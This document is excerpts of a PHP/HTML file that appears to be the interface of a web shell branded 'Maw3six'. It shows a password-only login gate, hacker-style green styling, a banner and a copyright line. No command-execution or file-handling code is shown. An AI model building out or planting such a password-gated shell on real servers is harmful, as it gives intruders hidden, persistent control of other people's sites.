...
if(!isAuthenticated()):
?>
<!DOCTYPE html><html><head><style>body{font-family:Arial,sans-serif;text-align:center;margin-top:100px}form{display:inline-block;padding:20px;border:1px solid #ccc;background:#f9f9f9}</style></head><body><form method="POST"><h2>@Maw3six</h2><?php if(isset($error))echo"<p style='color:red;'>$error</p>";?><input type="password" name="password" placeholder="Password" required><button type="submit">>></button></form></body></html>
<?php exit;endif;?>
...
.table>tbody>tr>* { color: #007fff; vertical-align: middle; border: 2px solid #31ed06; }
.table thead th { vertical-align: bottom; border: 2px solid #31ed06; color: #31ed06; }
...
button, input:hover { border: 2px solid #31ed06;border-radius: 0.5rem;font-size: 1rem;cursor: pointer; }
.ohct { padding-left: 1rem; padding-right: 1rem; color: white; border: 2px solid #31ed06; border-radius: 5px; background-color: black; }
.ohct:hover { border: 2px solid #31ed06; color: white; }
.combet { color: white; }
.combet:hover { color: #31ed06; }
</style>
<style>
.fa {padding: 10px;font-size: 20px;width: 50px;text-align: center;text-decoration: none;margin: 5px;border-radius: 5px;border: 2px solid #31ed06;background: transparent;}
...
<div class="table-responsive text-light" style="border: 2px solid #31ed06;text-align: left;padding: 0.25rem;border-radius: 0.75rem;">
<div style="text-align: center;display: flex;align-items: center;justify-content: center;align-content: center;">
<a href="?" style="font-size: 2rem;text-shadow: 0px 0px 10px #31ed06;"><span>MAW3SIX</span></a>
</div>
...
<div style="border: 2px solid #31ed06;border-radius: 0.75rem;padding: 0.25rem;margin-top: 0.20rem;margin-bottom: 0.25rem;font-family: 'Kelly Slab';">
...
<font>&copy; Copyright</font>
<font style="color: #31ed06;">Maw3six</font>
</h5>
<?php mR: ?> 
</article>
